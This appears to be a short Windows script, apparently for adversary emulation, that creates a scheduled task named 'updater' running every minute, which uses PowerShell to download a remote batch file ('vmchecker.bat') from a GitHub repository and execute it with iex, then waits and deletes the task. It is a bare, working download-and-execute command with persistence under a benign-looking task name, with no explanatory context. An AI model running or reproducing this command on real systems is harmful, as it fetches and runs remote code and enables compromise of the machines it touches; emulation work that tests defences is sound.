schtasks /CREATE /SC MINUTE /TN updater /TR "powershell.exe -c 'iex (iwr -uri https://github.com/LeMagicKonch/BlueTeamOps/raw/refs/heads/main/Adversary%20Emulation/vmchecker.bat -UseBasicParsing).Content'; schtasks /DELETE /TN updater /F"

timeout /t 240

schtasks /DELETE /TN updater /F






